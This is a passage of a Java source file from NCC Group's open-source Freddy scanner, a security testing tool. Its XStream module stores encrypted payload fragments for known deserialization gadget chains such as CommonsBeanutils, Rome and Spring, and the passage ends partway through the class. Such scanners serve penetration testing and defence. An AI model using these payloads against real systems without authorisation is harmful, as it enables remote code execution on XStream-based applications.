// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java XStream library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class XStreamModule extends FreddyModuleBase {
    //CommonsBeanutils payload data
    private final String COMBU_PREFIX = decrypt("oXwvEmIDxbwTHgI637bn7EozyHytlgWoMf1C/3L4NfjNM+cWr78pXtL8mQuIDRvqgwAkLTkzPBAqTe3hdl1FmbKnCrm7ZyOSoD14xctJG2Ihv5B0+Ssy69ebastJvvHAeDX+MVhHfRKFYnWIrA8Sx63V4Gr4gjhals7mLLdScZyZ7JF15qn3iyM9xp/xUfaAA+zdy6E4K1RnBxuLKh9yobU6YHC12S/ZWiegXQxrteow+DOeNDTMsA3d40r8tVfC3KcJd0msMPU+pvybcYxYp2yAp19HkEGlwftTn/4gkjGsqIe87saM3WD3gZzlRSh7iKu4FsYPiU+YcStpX0RyON5thXBN4l3Pb6W1UPLY6nGQ4thbwKCU21iDosO7/sUF35arJ4quV4AQ/tCnOS5p9Oh2Nh9lOW3u8Al2pVDmrYcWbROcQsf0BujyU1d18gjZufTcUpfKlI5Jwc9Vz/zVgvIhWMa195WcpPLaKcwSm+CbB9fpvVByX9ipgZ0+rRcidS00dzeNPjQw6zqvidHHZNrB0SmjiYVaw5ZMGwP/r0DbnXiqUVS1Jzbu9bubzoIvvQHfr1rm8nl882BYUPFLo+qIn/Hg+0Wj1pTyjy+TIz5BQ61ABZZ5PRI6gbJqAYTAGx/0mKMwD5Aq1KXhzGtZP/DSU2slBH6cOPe6VR2uXMU/0FhY/S6uGUvtBuNeMN0B7VqlZ5wbyD05Mdj21cqCAZovpVc3Awi0hr3omeURfPRNHmDzSLZl7GixpEkzm2g6oU+iAMdj95cVIQ+unMjTQXr3DdM2b20qcc1tJxZiOPJHi//zDYiCGd/A89amOeBUayDeaAgrcgyhbiehVI8PrpRZSdaoKxfiM2W2Nf9vp4nznwUNlWpKx/dXYwy8doOGVQ3TOq9e5NvudkGSYI5OqPkiJ4gLaHD3O3q5zWCdHM0u72ZipDAqYHRkfgBfV/n5sOtPbkccYti+L7OKNhTvcw==");
    private final String COMBU_SUFFIX = decrypt("TkUC0mhyIVA9WbiK1Aqjei3pksLQgiYXesoJANJOTHyOtT/nkilFwqk1OqgRfHXZ/Pj6g5uMk9IHvB4O8Qyq1xZtE5xCx/QG6PJTV3XyCNmST0MINnrDEENtb2eQYozk0poHRv+9vAsV0kl0Sh5kiZklbBizIF68jesBnVCQm0y4/rnn74LH3vB6EN3KGg7rpYAu91t17G+G+9reV/aZ+ebWtuQXckvjMKty652lftGZsomyWJSQMpMw2dLPhs5tg+iLU+GhWcqcd3dAtucAbw1zJg27rUgzAepp3WeXGYBGTqokFOqqVOjjNlL6VoV8kZ91WaxWCLXj5q3vS1924UecFyQyoqfjPYnT3Jttbq5VsPZbJmBMoDYexzQdfqQR1BS7ijUC6gSaZsnN8UAGjjc+um8UzLrgiIBhiMPJtk4m2l04q9WmbyruTs4jlZP3uPy44CHaMxx2qHKWHTKEv8oqpu/CjRrSt3n6FKJBZsuwRV6DlEOEufqDz+bmTzuHnbxsEqBjHASwNxBBh+sQMVqegqPY5aUqeTd4rEbRVjgdu5UBQV2Ko/w0YfuHAcNgWp6Co9jlpSp5N3isRtFWOCIThMEXBH67AuvWQO54aMI/lE8PkHHzbkNMKIrm3VOmNSyItUoRB6DzQACGCWO3sETD6c7+YAYB0is9kABejgtUvsqGafT3d2679r9TBErblD9veBDG9n7jsXR7uF09UloGe09EEnqmiCnDNI4W74L98Cu+nagA53Ie9k3BUHMLoWLeXNq3TJLF1tPk1mxLQw==");

    //ImageIO payload data
    private final String IMAGEIO_PREFIX = decrypt("xac+FCHNebBnyoAmcZ+8LgYxXmPYQjOfUffGikgj9soaBOyLBs9rpuee688muSnE4Kg/88/ANjyQmWrhB7oycE7Ao6h/9HRrQmH3nELgN0r7enJks5+/9lLaafaij0g7sXz63mV7rJwM9j44RL5qvf6EasE3g2cUGaf90sOzCV97/pBL3ZzHbtp9bT+LKG1sCLpcjOalPyKU8TUim/fx6sZIhg3Inb39/ICk0iPgw6WftRm5whbyumYDZAhW7Jql5UidcODD0O6blSMD/XKkxFgc97BdiSRKsXMATeBOPqEQ93kFpEClgfuI6EUR0zd/jTaScL5mPCtyNVRxO9irLmY5yYuDfft/M9qwBoW9IDILOp5NAUP7EvCuTRVFhkHao9Y7JLbFXeBPoHdoG8c9zaOuBDOGmUCVGAfnQ8ha2jLufom0cPl8YkvUfqPvx0kOBrTMZvZ6ofR+DM15kd3LtfAifWbfy/IYEOKMkXeJM4jUXM2JaaYRBoFf83tbeRjXW2+E7LaSCkmP8w97fBweSj/OX+DlLj2tGC4a3G6D2oMCo76o5Rsf6+NlsevdLRdKfUTAhTM6OB/tShbE6S8lLq9ztzrrT/0bbcreTiBqVVejDaEHGolkprocw0CBU2krvJ+qPTGT9ANJJihHSXZ/9qxp9hYyrmTV9cuj4tD+PpU330hDQVrCO3w9/0Ci817e95YkZIR9Qy7nKBMmlzMAyLwAG15b/ecrxzlRuOuP9Bmkbwtfzj7Ruen7kd6guRbzAgbE4CDLp3y99Hn9W6mIuA==");
    private final String IMAGEIO_SUFFIX = decrypt("DcE44H1Snp+bgcIEWv7nnI/2LtI0t+0kShRzfAW0LKOfwb39JUCIYf7uqAiuGji2A6qlML5+GH9OhSUU/WvxJiOQMqYiY8hBiKcEvYLs1YJajs+ENj294dPf7Q8mm15q99gxQ8clpe/yRJlXQKZ58TXsyaHC9LjWliQUhb2LmYat3Fv0v+gkLD1jVhe46vAGmoHtac/WUtsq/5OVzwH92UEfu9q5wUVho2HqInXJiBC6C8SO2AXCEAJrF2apQ4MsMpaXd8ZZqvKfzSt+QfH3Zy2Qxi52NyWla58s8FzP09c+Jp9r38auxTyxEW0UwlmKn6xENfnov9cjl94W7uJPSPuDbFNIFBsb+5tbI28HWfXdBLB6kA2RgW8MQZ5LMtlNfKiIoWizif3/eHSKgrHtsg2mMBvuvHRAqP5nFTWzwUEYd6g9wMmpElLa6mmlNl2HqrPApnMc1t7U4o2C/VIVST73I+FJ67JmcCVxc7S79+3siwGt3yt7QeVRfOGc+C6aibRGwsM2N4IuRwgzye314AU066OS/8qN49W6fCLk4uyHM+ERpHkwJ2xbO3Zi27dxZ3H4byeRJTv4uj/hYXNCQznbFGtYs4XIKLLHMFkwCUazCNnFSCijkWO6NtdGXMONcMjo2awxl2nLPkt0nknmC2ZRjZbADx/0XJatFZT6UZe7yt0W6JvdiC1bd6wfiFSZ9D5gXQPc24SuOFS58eoCuGm69QHVXWRI/li2im7NAhH3l4OcZpZhI3bUvCFQ2fpduqT5KpPUGNIgtt88CQ97oGQawPjqoj60s7NV8JcgxWiOzGHsdsKTfZKNcuWTqXNPg2K8v3zXKM4IudywDRl46AtS369PuWo+2oes7qylNQrUHJfMpDpcWSKUL12bsTwRGAbdnnqR233nJqhkrNp/uTRAUxAI2WclofsOGeSRyk/o0gfGZZLC7qaBQ2t+laNhvOsL1CY5K3O7K4w+aXS+ZcPuiQ8MRgSJCOTLY5wVEkIRfTMRVN+QXnPX4HR16/HGwosiUS7jtIiT4q0uDjv7mv64UP7OBuwMNGf7fDIwEz66pPkqk9QY0iC23zwJD3ugZBrA+OqiPrSzs1XwlyDFaIhP0Tiot3BoiOE8BP58+cKblTyRVmo9DQL7A0UMkJ8dlnErxtsHM9fErhS05Dg2xEA5bVW5ozxHZ+XbVSB5VDmKa8JMV8SdfCXYym6VlSST+rEp3uoZFde9s/os60I/Fdy/SQdFG+6nYQVxfJc9iJGQs7gvq8QZJm6B6kX3v/4Z");

    //LazySearchEnumeration payload data
    private final String LSE_PREFIX = decrypt("xac+FCHNebBnyoAmcZ+8LgYxXmPYQjOfUffGikgj9soaBOyLBs9rpuee688muSnE4Kg/88/ANjyQmWrhB7oycE7Ao6h/9HRrQmH3nELgN0r7enJks5+/9lLaafaij0g7sXz63mV7rJwM9j44RL5qvf6EasE3g2cUGaf90sOzCV97/pBL3ZzHbtp9bT+LKG1sCLpcjOalPyKU8TUim/fx6sZIhg3Inb39/ICk0iPgw6WftRm5whbyumYDZAhW7Jql5UidcODD0O6blSMD/XKkxFgc97BdiSRKsXMATeBOPqEQ93kFpEClgfuI6EUR0zd/jTaScL5mPCtyNVRxO9irLmY5yYuDfft/M9qwBoW9IDILOp5NAUP7EvCuTRVFhkHao9Y7JLbFXeBPoHdoG8c9zaOuBDOGmUCVGAfnQ8ha2jLufom0cPl8YkvUfqPvx0kOBrTMZvZ6ofR+DM15kd3LtfAifWbfy/IYEOKMkXeJM4jUXM2JaaYRBoFf83tbeRjXS6iwAwOiwbygX8DA14QNIZ7mXHnvZD4smOWZBnc8/HdmlQg+mTW3Uq5hNiBFR2m5XKtoGtOc6UOTEIht2GkgBFRSfgGDrTEXwVSkZJIY/R0GeEO5VezBw5XmE2Lty/HYnasGY7jF+wcNL9FhUQ5E8YV1mpvTb6u3iW5tbkwFSnzQcceDuJ7YmyMLmqarFZIkMDAusIQy1joQyDHz16HdcFxJx+rpNUXvkx3sCZsNQFd9QwKha6fNb1iVzjbpREG82zF01c5OHEYUODz75Ik+F1B5DrUCvOH4hHXt3w+HtN4JuYHFhtD1vb2vgiUJmaIxIPK1nsF5tc6ytxKx0YCrKyo4ALimbxaz6WOGJ5mVdpIMGCDmadCh4+xi0lE4lz1ix20r71OSMdz/BVGI+g9SSy0L9e11FYG84eJbPmUOrMOiUSSpaKy/XoDyMuluthpfYtGq42UewzNZ5r8Df86A6/q1vYklGX/jxL6aQZO7FLruL0LmlJm6icI1x+5NZXxtNO077icsgz/QkYkseBqHcYiruBbGD4lPmHEraV9EcjjLsMc4LJSSXvi/VTZM9Fb5upiGaqySoxqXeVYQDLaB0Hg3uvFiU6er4R2H86hJ/05EIBFa9L6dCD9bTiVUWwXekCSrMoxSIPPNGQhb8+q34Hk05otSV9OAhpA54SMUBfjvPmnoxVFsHhgnTUzuNAUv0QIoZ+TZXNfxUpHZH2cpih6JGcwCb9Hggec8mVbScQelDz/IVcErWDdFYaPkRJZqyjsMqcux5CV/C8lR88E+v/lPhak2UoiSUmTdE22nT7iiqG4+BN1fHV+5+ort/RLnfVVvlJN7BnIKzvlR1mV7seUQDSdLJvvUqQt6azSACoE=");
    private final String LSE_SUFFIX = decrypt("sViLnGUt9EcQdiLjZeQGiEmmevNkBQ9JHgbkvpVtBwBB9m057cpmP/hzStKSV3Y1XotL9hm9ibVzgtQ0YsjBCL7o8EzMCT/POdXyusaSNIaK3sb7g8OLIfiBXVW5Q21uqTXJyLShm3xKQdSGWg1YX+LkrCvIaHaWLMfwJsEHRcDrqtEctfXrAZ8XkMkHhAAARjrWEfkFeQmgM0v25gPo58L4FmC/jF4IL2STb1ZQ01sWbyfEMxvg5oYdGZFOjLLiHt737qMuKTRi3yEEw77M3TDg3eaLj9+Bb4xVZO3zoXPL+FXGjoMx9qzwjvUR+SoUMF19D1TcPr5ik2sjPvfvJABl6f77aOAJvMMCyZvX4Lbkl/CsztPXx1LlCH2MYgv57eG8fkd0mmK5Qxa5+D4jiPNIYoaE1Dw92eyBx8mpxqLonqEvHoYBWW39EL1IMn36dM0zFDQrhmoY1RImZIb4rwXjrZ3xnMacNa3uKlGEUy/qaJPeBf44Xj268HxeicED2kK62z9vWgUe9O5TQNUujuOba9JDgw+2Xks/dy4M4Tz++85wnSKuGwQi2ljyzu5qaW8uoxh+L4n2eZuXXUB8e25U4S6WqhIyC9FhJRGg77BTlMEYEtnMUyKORV7BoD6qQJpaMfky5eGHfQRtoK6GvcGOJJbu1GxxobU6GOGKv9rFUYOBDvV3jeE0CSarcis3s6VQuScyw7vKjHupG0YzZKc9/JEH/2dTdEvg0eUJi2vAmygoo8OrrwKuLIB1mBpCdV28m1HAiyi82qVrlqD4XwZQWAzsfM/1yOmyB5WyJNps0WOZ/w7OngQLi3jrYZZTwlyDyiHD7kxQcYflTUjgTRdBf0Sb/w6wOtAVRkU1qkk5P5PtfDHgP3c7Fz/yxoYEw+6JDwxGBIkI5MtjnBUSQhF9MxFU35Bec9fgdHXr8cYD/I57B2uIiGV232bt0UWdQ3K0RGmzTYmCJ8NaLGSBN29N5SG/lbuEqGMFkfmIWUnTWZvZkNv5xSDsKquVqQviinikljur9r/7a9jAjt5z/BgG3Z56kdt95yaoZKzaf7k0QFMQCNlnJaH7DhnkkcpPxKJDFyQIQzhg4zAkTLvbcxoO0+lo9SHOUyiSgcPacw3CXIPKIcPuTFBxh+VNSOBNF0F/RJv/DrA60BVGRTWqSYhbkYViSCkqJyQBdlxoVjJSRnU61/liBkVkDJnCjzgve7btQFORhbHtUKtN20ycwEAfRxmLgHW/qHzcyIKEXGb7tz2TkQ2KBcjL/NJjvzEobXqClM3vNTCAkNZPIOGGfV4xSRWCgq+a6Cuk5JqFGHS6l3DBZUiGVOOMQj4NADnFI3oNSST0UdiKJciQ05SKoQ==");

    //Resin payload data
    private final String RESIN_PREFIX = decrypt("yT3Xo+Gswx+EclCLhDg+wOkArOOjPSup5NJ+iWraruyjFc8Bas7PdohgipBua2sXtOF2gTRZVAGAVeveO+EtG2WyNHQKZZLzD/PJoWRS5mDSp3vb11TZksnLhhaQf3EyXxJWmNtGYyXWY38RMoHd8ItIDkDYSlYdkWfIkLdpnmqOzJ9syMxjyL+VFZ7zCps8I9iwyQIJjVVXTuDtx6+DhDpEsD27wcztasIRUgV9fCxCsWWoSxWRBPlTL+2YMJmuFVnSEsw3+vyqiBRi7K8S7UOZ5lvT7KX+TIi3EvhSfGUZkFX+gzfxi5vAO+lSl29lbKBuq4xgIbn/neFXtjMUZi0kr7uVXXjEL7e0cTee8aozkYI6qKROkbbVhuI0JJnsTiAAGdir+8jdclkXS4j0qTns+IJ68wy4o/GJxX1xaB95QCpIhAHhDGckz+lqXoegWpWxkDXS9INC3GWZ1Dy0JYB/v0V5hYSA9b9PyYJWpgsFoDpWxzj/CNdCNRHhJ8X8iS6WK6zEwWNVPokRLZ6opPN4Mn43IDZSLhSVZNSAp+IgIAE0M8z2zc+087jerOg6/nAWu+tkyxg2nK1fU+zOEbg5ERmkeG2O4keNH4iwZE0I3LX3TyrgCqiSg8GhSXkegfebcLaKcIDJegOMfJ5ifCG3iAGz8v76Vgi/8qXzQ3pxCFwoPjGzbyjhRoYLgDZRrPxKSZuiAeLcj30m40mQ8slIHopVCozWzY0ag9xOPsvq+0QWo6liEsC/rsU3tr1Hxo/rr8A5MhYqjd7AMC+GaFCRi8RzDVY6GRwkdj+lPLZZsdNfIjCowlTUSqmEH/M1kPdqP8sCoYTAxfinyFeCM07NBvQl+I2qfnGoagN0dz1AgH8UCilEmfoe99OuFACVpl43dY+rO/7atefhH3AVS7ugCaXCnpilw375qT3h/OGm8I3DNxT8KOFWlbDhHG5aigtjV0PGQJGemBhonl+9HT72BTOwl7lgbY1nGNZDiRmDbIzHCN+KJz5ctaRPdHloIPK1nsF5tc6ytxKx0YCrK94OUKRxiG7Ef1dNB0mWHBnJKlZft6hSb5MWkd0bMaEaAU8sDkoItnKtMYavixpDERu308bvM6Ests5OiIFbDnoBckqEVKVUENqpv2wcJnnNL/ETdRKzqHzBU+N/GwB431gB20ERJTf67mVZ6IbGZFI=");
    private final String RESIN_SUFFIX = decrypt("sViLnGUt9EcQdiLjZeQGiEmmevNkBQ9JHgbkvpVtBwCsSkWl9wWupRfnpMRXzyW/9uDAthXm2pvWWMDVCuey800EXSNh7Hh4tgfERJ+1qaWsAkdoIkdwoelF2Q7R/LOAUF9coQBYv+Vn4SYdXvD8hLI87nZYCMQoIWfZKrpkRsWxWqrsA7MJ8+B9gcUZiBeNPRa9506A9LCoJv1wweiP+aiyEBJyV7WN6vCYWdpqT+LCISB1GgyBhfKrl4ETllnDlfCA4hiyC7t7sQH6aQTnxLfa0F3KY/tpRFN5/BfhalDdFXxLWgXO2WetVPwMYOBwerYlbCn2Q6SREbxdOaUTPt8KIz0npgAQAloZmyPHghgsDo6Oar2eHm88LCs3P4QV1sKx4MjbfQSVi0OC32evdZxbBpIrYGPmHM/M9ulSgEgbw4ky17/Qzu2oEgS9Dw/+qC6Zk16f8CenEw2OxvZXifqxKd7qGRXXvbP6LOtCPxWbI9t0hv2t90DPc1UOFIGe/c08cc6A6xzXUvIN/RPJg4HGmQPUr36ereuidlDzojYK+Ph03PG/KyChZeQ6lW9/blLgw09a8ldUqOJDIT/qEP3NPHHOgOsc11LyDf0TyYOBxpkD1K9+nq3ronZQ86I21HK6G+M8CVaJ4DacIkj2H9/Ro/b6nrrSBgzr5e3G8V4=");

    //Rome payload data
    private final String ROME_PREFIX = decrypt("yT3Xo+Gswx+EclCLhDg+wGKL2X5NHWqyJxc85ThpBKGCAjZE7fKJsNliNcIcwFJlwU6wsZt1xEW/Sf1zxYBwk7ZjXNU1wBAW7+9c5EZQAtbz9RgsM9jx8+99DdUH2/I1kxu5xu6g1N+AwSVUb0gwQoJPUk05sWalvQaBnIvNUBfrsmHEiUe9T+PYyhkaSBTQ87RIE8o5FQxXyECHUYjQjVylGRbbZRzyz7rlOTQOVc2cAv9w4Dk9YEfaDoqmz6sqZFFqbJHzmgYnQEn5+2gaJ7mRaD9uEH1J2qyXRnXsXz7kcEC9lqcBKf1gMiuFlaoO8FjD/RIPKMO3R4dkjeV+aLItfqcx+Z4lN343pKqvtiZzOB6QQdEqeXaQAORbb3zsySLWgwJe+bqL7zr/fCGSHCz2YdkLVkee2K114ijoKunwMap7O9Qk7cdPgTf/URvO7vLsT0PKVROR13tFuqnvb1RlZhL7NODm8xh19imI0brpRNmI0mCisNx8sMGWxTdzvVP/fmiQ7dA8wCRjKrMc2iw9HeWygwMPfLQAfarB3/2+47IgyxJvrgRusA6jEwMcyr6cu9st4eE5e8ZRncfIe205SNKQW2czzrsImBWy/AVBG1oMlrJCaJL6HUYqoi04CEF4Te8AuYxcFdQY0dx3XeajHWuvH2TFaUwhBzxii7p/hdf5T2CTzIjc6061cSwsitNNP1EztWDa+fZcNio6YZmQfbo1fUJRl65qabYOX76y0CTk/K5gsx9iTEAoxqN6kIT3flMiqIOeZ7egZzS6H6oicr1pn5v9/n/IbUcgHTSmUELIMywSCItr3Pu2PDWgR8b6WNTYNWytaYg+bR5ou5EvBuIFZhu7syHRARirqg4=");
    private final String ROME_SUFFIX = decrypt("TkUC0mhyIVA9WbiK1Aqjei3pksLQgiYXesoJANJOTHyOtT/nkilFwqk1OqgRfHXZ/Pj6g5uMk9IHvB4O8Qyq1xZtE5xCx/QG6PJTV3XyCNmST0MINnrDEENtb2eQYozk0poHRv+9vAsV0kl0Sh5kiZklbBizIF68jesBnVCQm0y4/rnn74LH3vB6EN3KGg7rpYAu91t17G+G+9reV/aZ+ebWtuQXckvjMKty652lftGZsomyWJSQMpMw2dLPhs5tg+iLU+GhWcqcd3dAtucAbw1zJg27rUgzAepp3WeXGYBGTqokFOqqVOjjNlL6VoV8kZ91WaxWCLXj5q3vS1924UecFyQyoqfjPYnT3Jttbq5VsPZbJmBMoDYexzQdfqQR1BS7ijUC6gSaZsnN8UAGjjc+um8UzLrgiIBhiMPJtk4m2l04q9WmbyruTs4jlZP3uPy44CHaMxx2qHKWHTKEv8oqpu/CjRrSt3n6FKJBZsuwRV6DlEOEufqDz+bmTzuHnbxsEqBjHASwNxBBh+sQMVqegqPY5aUqeTd4rEbRVjgxAMavkAZww6d3qbgOKrmjh3DWNgAl3SDTa82vhUm86ktg1W3IIQKHA0Hv8jSlQk5EUg5XTdVVQ/pe2SRt/gLnXbzNydFQTtgVzI3FJq7sqyzLYsGBNeio5P4o475lWI3qKPRf1+nj6eeyk73IZjwohMp5sGuslYhgoa2URAdCvvR6TGekPdRgG6TNxbUmupJr1ZNzUQ7k3H++g+/SR7IQbdVrJmX9fihE/fwSP08DWl28zcnRUE7YFcyNxSau7Kssy2LBgTXoqOT+KOO+ZViN6ij0X9fp4+nnspO9yGY8KCap2gxhmzJ6tmDEUHGn6yhii9l+TR1qsicXPOU4aQShggI2RO3yibDZYjXCHMBSZWvNb6wMZJ2XQUl6rFswXIyXk7cAgw9DHqwnqOs3x1HjdecBFUvq4tDinSq91Q5B3MKLIlEu47SIk+KtLg47+5pe2bSId7m8UyTKF0b0TZxXqKpaAzQ3XjyhYTUHMFIU+yp/VkvLypbsFpg5hP5slFCQs7gvq8QZJm6B6kX3v/4Z");

    //SpringAbstractBeanFactory payload data
    private final String SABF_PREFIX = decrypt("XRNCTfIQNnmFpvJy1wbeoUi4Ket8pBGkosCN6YjraeSh2RU9dWpF/e3BkTxbwUNts7KfFXJB5YqhRRmhCdbXvoQKlmfM3OpCn1ogbNjiQBOX/7ENzN4yxZKSRNc1bP0d5z3YnyJjg4Q6DsPPjt+1l/AKotHHfB1hm55hnaWvdzNgM/jedyi8sCeaeR290C8y726fzmAvsRu07OGyGOrm6mUfYk1XfmXOuf6mwG8JHLqr0+x0i63G6FQwaOQ3VjSCdAJdBZnQLuXItbQMyaiqeQ==");
    private final String SABF_MIDDLE = decrypt("Odo6DadrwiUk8fIBe0zsiE1TB1Sz84xEkLYA6J2DXFmhuDdINpi+ux9dD7/dkeiLMmwE3Wnupore+Cmf6S54IX/pGAOQYtgxfMBbTkKdz5vKw2U8DdHwOc5/AX5C74m3o2g2zLDqe2Wvaxp40ppBu1P32wyANnVicmfIjDywuOUQsZIUrlOdymQbdYkKV/hA4CylNDSRVzKGb2uKDalOkZ0UYii8voNFvR6jfOttBszKsYZK3lQj/2wcam5tZ8zHzgYDwQ4zeoVjDkzHjuA0VmRML7njuMU44A4eXvOZ90H65FOpPE/8yqCLV+497AQFT5i6vfPWZQlYLBiX4KOCJyPbGrg8jOToWmr8BQmKRKR7niibYrzmTP1JcdBMVef792vYT2fj77i75rkWZnovhg==");
    private final String SABF_SUFFIX = decrypt("L8b+5dRGKSA3ysMnhuF1BbwVeFfKtrMeNhR/ylx1oybxv/CEJfSKdgvI/K7sJC0AA7PTUgXbBq+JxrAgschcFu2DlkT2jUav7+ZAISdQC0tQzTum+ljltxni8HYNGbNHkyTDPupONAmrFZU3oYikxUQP47MQz2Yv9cO2K9sv1LbGqY+TfAsW+T0Feq3ECe9hbNCVa1YBM3h4IVlV6zuBsxyX+ah46Oi4U5s6BR965ikfKGB9xTZLFZ7QYBlnWDP2U6qv1TfUgdymUKUeBtQBhDCW9Emey2+LuTWfd4cCeRY5u8GnaHYVSnx3JLYjt0i5nNoU8I2zqITWzKwNIjhqBpMkwz7qTjQJqxWVN6GIpMXet2NMRpLRJdCoP6eHzC5F5vsPFs0jUeXpckgeEIj0KwDZcwsaE/YXxj975dHGp1hLZFuL4BC2QOGvcOmAsMZSLM/1buq0CNE0UtcyOlluGaxP8PoWnQM2R6XUgTP8X1FX/58nd1xGQsbQoHyOKQvYRxz3D4T0CqZCyWcqJOz1Our8FhaW4DanliHU8kcI6cwnRcse4+ZZLlF9SrnCrf8f8KJxahVVfJKrncaoC4OOh7YJbZzIdiljtTZS6PfOj+nngeRc75nGyuc7f8bXceapUN0a7p6PQ4BOVvqsL6HvPdC8Q9Ub60RGJHZJsWtT3MamC16ZHEOHZKF5JehGYmS2tgltnMh2KWO1NlLo986P6eeB5FzvmcbK5zt/xtdx5qlQ3Rruno9DgE5W+qwvoe89bYjCOYmrgHR85LC6Mj3Rb83mNvh7Py+xOLZjrXDD+1OW/J2koRUlYDJfEDRAcOHqnm1I3YDfbtm+mRULP4zyPwXzhvEeEWjzYxWGIxhAN4ZsIgCMJvEpfumOZur58N6GczgekEHRKnl2kADkW2987DeXEKNmUcbmz4lB6SIh7/U5RS2XetoUXIPfbm/7D6gKvMFxCrVcUkOE3Cw5cFAeeEfXIdFwbtylunV1trzxdTRBn/zpxT1pg7ZLBBBjzWCMV/+fJ3dcRkLG0KB8jikL2Ecc9w+E9AqmQslnKiTs9Tp46+YuKMYlRICPjLyrXpiILS+QXMEsQxIZCFCrPOY3fPTy9fb1J4zaxStW1wMtYGx5VTM2dM+xYmKuQGBCwfpljth8QDFG7xE5cycuBAH08v0orJY/BKBhWSzxqHE3z4bqkS8oKZMLA8+7PlQt+YO3tzPescEnLIxE0ZWV+2fUQw/dlB4D5Vzv4lNX4GJk6uyA5BOGaFwM1ZT05WcqJ7/Bz8eVjMD441UQMgaVeCrg1Anb5+mLToV+8Lt4issBE4YyRfZJ8ZHCfWt/c7URbPg0RAf9++MtwDdkVtBM4HeyP+AjlsDR0nuZ5fLIATJ11dDvbp/OYC+xG7Ts4bIY6ubquU+9zy4gEsGFyabHdj4oxCFTgFFo2uVRuoAm64elujuC9+fzQ2td1nGWvCJOk1rENtx8cBbwloBFpwSYWoSVTAJnKHqD9sYptAt7LQxQaqhV589Cry0x0yHy7poezHYyUM07pvpY5bcZ4vB2DRmzR5Mkwz7qTjQJqxWVN6GIpMXPW7el8kwL/57a6AvEXfUbHywGisuhiqJVxN0OXiqCOKOQw3MJaZ19VtFoCmMZ6sccl/moeOjouFObOgUfeuYpHyhgfcU2SxWe0GAZZ1gz9lOqr9U31IHcplClHgbUAYQwlvRJnstvi7k1n3eHAnkWbVZL2Ox0hw7O4fbVYRbqt0cc9w+E9AqmQslnKiTs9Trq/BYWluA2p5Yh1PJHCOnMJ0XLHuPmWS5RfUq5wq3/H2XiUpfx8hMENKkoOfSGswr1fKGoDqU9L/sSVEKsr9HzRxz3D4T0CqZCyWcqJOz1Our8FhaW4DanliHU8kcI6cwnRcse4+ZZLlF9SrnCrf8fqJaMNfRFNXfCILPzIXRpEe3db0arBmgqMC9OALVYbqU=");

    //SpringPartiallyComparableAdvisor payload data
    private final String SPCA_PREFIX = decrypt("XRNCTfIQNnmFpvJy1wbeoUi4Ket8pBGkosCN6YjraeR7bIrU8ZLTIVaAGcGaNYx5aLtQt5yoWJu0EPJuNUZFws/MMzMWsMCdkPoeq8C85LR/j0nTcjXGS3AAWvvNpGRySyNv4xAK39y2YHjVszi1Kv7q2+4KX50YK731/emsochkEfYLrAqbZvBHX0cDE4dEPo77rVBq6h2lx2tWOp62/+PA3Td3Q2CSXbc2ET5QBtOI004vldw/VoImo55NNlqEtGS8852gl8J+qmuNZs4G+n+PSdNyNcZLcABa+82kZHJLI2/jEArf3LZgeNWzOLUqieNe/yAWRgXNEJZ4SJ2xj9+9cP0Ow4KqtUDr8PEdk2crjkVEpW6zgNHj8RiqzPl9kyTDPupONAmrFZU3oYikxbFF/lEHqptA5SmU8mOGEd/QICmyRWm68jFF8jhDWv3PSFg7YPOlpFxPVKrAUiyEXhgso3YiVNjE22DdBcS90xBEB/374y3AN2RW0Ezgd7I/NBVthpna0bZ7gzvnyDVGzJDHWhV6BN0uKX+7Z+hhc+ugdpy4PY5qIbS9/9xi+G9CtXHKObbibo9z5K7hZDlYz5/bPXS29CIgsq9U4namB78iXHErSEgQNzdU7yFcw/uUF+OHOdsPMC2tiGiNZ6n3zKWNeN+TTMhXBeW8J4AAYzpGnhzGiasoqQSO77N3xqAKoV73xaGeYZYLug5SgQkZOfVSjoXXL+5eGyawbydBQmp6QFU8bxLlOrzgZorU+QL2FvkR2KVcj797aJwvUnDfCRPNbePkoJdl08kvxNSHW5uKhi7Xu0PGWeIyEmYdswst61n9hjonITcVpI/XD3IsQcmkpntffYEM+bZSoVl4UNlk4RJfudUTFyi/Km4wLFFYDFKLMDLYha0+qr9E/Pm9s4aZnq0sfveB2CkuloZ3qIPhxZvLjSeXUQOLpW3S4d5kj0EKHY9JMwAUpoRJ1KxW/H1SpFZXUerUD9uUf9JBcDq7sDp+wF22daIWEZpFykqElSUW6jLf12fW41blYVD9Ni4gnoCDhf78KIWRNCjWnYdBeBjlwaXQk7slZXF9m6shjTYcsI03nSO3tNV9VWrqtB5Amzhk7AhX1k+2V5Q/klbbVYFuy8ppGRmMb4jrPhMjECzeN/pqjvegZbFSYXXAQCrbaD1eacHTLFIDEwUNh0Rkp7w6OiARjHw5JfTGB6Nynr1VEcN+l1BmeoifRkzv9GQ25h7tH4EiOV8c91Bj9Wb/MoWPm7ivPpjyz+/t2/w+W9VHa4FOTDY370sWxAxvUkaIj+B/n9HDwr/KNe5kppSxgUQKAY0mOkyc1XyaZJN/GF8/3wYFvIFPWwDl6Pj27Q==");
    private final String SPCA_MIDDLE = decrypt("L8b+5dRGKSA3ysMnhuF1BbwVeFfKtrMeNhR/ylx1oybxv/CEJfSKdgvI/K7sJC0AA7PTUgXbBq+JxrAgschcFu2DlkT2jUav7+ZAISdQC0vcQr1R6ADuxFtUFhe5296Z");
